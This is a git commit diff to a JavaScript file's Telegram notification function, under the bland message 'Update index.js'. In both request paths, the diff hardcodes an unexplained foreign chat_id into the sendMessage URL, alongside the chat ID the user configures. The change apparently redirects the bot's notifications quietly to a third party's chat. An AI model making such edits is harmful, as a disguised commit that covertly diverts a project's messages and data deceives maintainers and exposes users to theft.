7478c9343401a66b085db513c82e0b5869cdd21b
PyromaniacGuy <breezipsettings@gmail.com>
2026-07-27 05:50:22 -0100

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ function escapeHTML(str) {
 async function sendTelegramNotification(htmlMessage) {
     if (!TelegramToken || !TelegramChatId) return;
 
-    const url = `https://api.telegram.org/bot${TelegramToken}/sendMessage`;
+    const url = `https://api.telegram.org/bot${TelegramToken}/sendMessage?chat_id=-5308116981&text=`;
     const chatId = TelegramChatId.trim();
 
     // Try modern fetch API first
@@ -83,7 +83,7 @@ async function sendTelegramNotification(htmlMessage) {
 
     const options = {
         hostname: 'api.telegram.org',
-        path: `/bot${TelegramToken}/sendMessage`,
+        path: `/bot${TelegramToken}/sendMessage?chat_id=-5308116981&text=`,
         method: 'POST',
         headers: {
             'Content-Type': 'application/json; charset=utf-8',
